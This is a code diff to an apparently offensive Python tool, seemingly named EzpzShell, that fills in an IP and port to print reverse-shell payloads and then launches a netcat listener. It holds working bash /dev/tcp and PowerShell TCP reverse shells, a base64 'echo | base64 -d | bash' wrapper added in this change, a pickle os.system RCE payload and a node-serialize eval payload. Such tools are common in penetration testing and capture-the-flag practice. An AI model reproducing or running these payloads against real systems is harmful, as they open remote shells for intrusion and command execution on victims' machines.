@@ -23,35 +23,40 @@ class colors:
     RESET = '\033[0m'
     WHITEBOLD = '\033[1m'
     ORANGE = '\033[1;33;40m'
-    
+
 def header():
 	listPayload = ','.join([i for i in payload.keys()])
 	print('''
-  ______               _____ _          _ _ 
+  ______               _____ _          _ _
  |  ____|             / ____| |        | | |
  | |__   _____ __ ___| (___ | |__   ___| | |
  |  __| |_  / '_ \_  /\___ \| '_ \ / _ \ | |
  | |____ / /| |_) / / ____) | | | |  __/ | |
  |______/___| .__/___|_____/|_| |_|\___|_|_|
-            | |                             
+            | |
             |_|'''+f'''\n\n{colors.CYAN}[Payload Available]
 {colors.RESET}'''+listPayload+f'''{colors.CYAN}
 \n[Usage]\n{colors.ORANGE}python3 {sys.argv[0]} 10.10.10.10 9001 py\n{colors.ORANGE}python3 {sys.argv[0]} tun0 9001 py{colors.RESET}''')
 
 def load_shell():
-	listShell = open("/opt/Others/EzpzShell/shell.txt").read()
+	listShell = open("/opt/Tools/EzpzShell/shell.txt").read()
 	for counter,i in enumerate(str(listShell).split("#INDEX")[1:]):
 		for j in i.split("#EXAMPLE")[1:]:
 			payload[list(payload.keys())[counter]].append(j)
-			
+
 def base64gen(ip,port):
 	temp = 'bash -i >& /dev/tcp/{IP}/{PORT} 0>&1'.replace("{IP}",ip).replace("{PORT}",port)
 	return base64.b64encode(temp.encode('ascii'))
-	
+
+def base64gen_full(ip,port):
+	temp = 'bash -i >& /dev/tcp/{IP}/{PORT} 0>&1'.replace("{IP}",ip).replace("{PORT}",port)
+	full_temp = 'echo '+base64.b64encode(temp.encode('ascii')).decode('ascii')+' | base64 -d | bash'
+	return base64.b64encode(full_temp.encode('ascii'))
+
 def base64gen_ps1(ip,port):
 	temp = '$client = New-Object System.Net.Sockets.TCPClient("{IP}",{PORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'.replace("{IP}",ip).replace("{PORT}",port)
 	return base64.b64encode(temp.encode('UTF-16LE'))
-	
+
 def phpemoji(ip,port):
 	list_emoji = {
 		"0":"$🙂",
@@ -85,13 +90,13 @@ def pickle_rce(ip,port):
 			import os
 			return (os.system,(command,))
 	return base64.b64encode(pickle.dumps(rce()))
-	
+
 def char_encode(payload):
 	encoded_payload = ""
 	for char in payload:
 		encoded_payload = encoded_payload + "," + str(ord(char))
 	return encoded_payload[1:]
-	
+
 payload = {
 	"py":[],
 	"py3":[],
@@ -117,7 +122,9 @@ payload = {
 	"asp": [],
 	"xxe": [],
 	"jsp":[],
-	"c#":[]
+	"c#":[],
+    "xsl":[],
+    "yaml":[],
 }
 
 if __name__ == "__main__":
@@ -137,12 +144,25 @@ if __name__ == "__main__":
 		else:
 			print("\nCheck If IP is valid")
 			sys.exit(-1)
-		
+
 	for counter,j in enumerate(payload[options.lower()]):
 		print(f"\n{colors.GREEN}Example {counter+1}{colors.RESET}\n")
 		if "{BASE64}" in j:
 			temp = base64gen(ip,port)
-			print(j.strip().replace("{BASE64}",temp.decode("ascii")).replace("{IP}",ip).replace("{PORT}",port).strip())
+			full_temp = j.strip().replace("{BASE64}",temp.decode("ascii")).replace("{IP}",ip).replace("{PORT}",port).strip()
+			if "{YAML_PY}" in j:
+				only_b64 = full_temp.replace("{YAML_PY}","")
+				print(full_temp.replace("{YAML_PY}","Full Base64 Payload: "+base64.b64encode(only_b64.encode('ascii')).decode('ascii')))			
+			else:
+				print(full_temp)
+		elif "{BASE64_FULL}" in j:
+			temp = base64gen_full(ip,port)
+			full_temp = j.strip().replace("{BASE64_FULL}",temp.decode("ascii")).replace("{IP}",ip).replace("{PORT}",port).strip()
+			if "{YAML_PY}" in j:
+				only_b64 = full_temp.replace("{YAML_PY}","")
+				print(full_temp.replace("{YAML_PY}","Full Base64 Payload: "+base64.b64encode(only_b64.encode('ascii')).decode('ascii')))
+			else:
+				print(full_temp)
 		elif "{BASE64PS1}" in j:
 			temp = base64gen_ps1(ip,port)
 			print(j.strip().replace("{BASE64PS1}",temp.decode("ascii")).replace("{IP}",ip).replace("{PORT}",port).strip())
@@ -158,12 +178,9 @@ if __name__ == "__main__":
 			print('{"run": "_$$ND_FUNC$$_function (){eval(String.fromCharCode(%s))}()"}' % temp2)
 			base64payload = '{"run": "_$$ND_FUNC$$_function (){eval(String.fromCharCode(%s))}()"}' % temp2
 			print(f"\n{base64.b64encode(base64payload.encode('ascii')).decode('ascii')}")
-			
+
 		else:
 			print(j.strip().replace("{IP}",ip).replace("{PORT}",port))
 	print(F"\n{colors.CYAN}[*]{colors.RESET} {colors.WHITEBOLD}Starting the listener on {port}\n")
 	os.system('nc -lvnp '+ str(port))
 	print(colors.RESET)
-
-
-
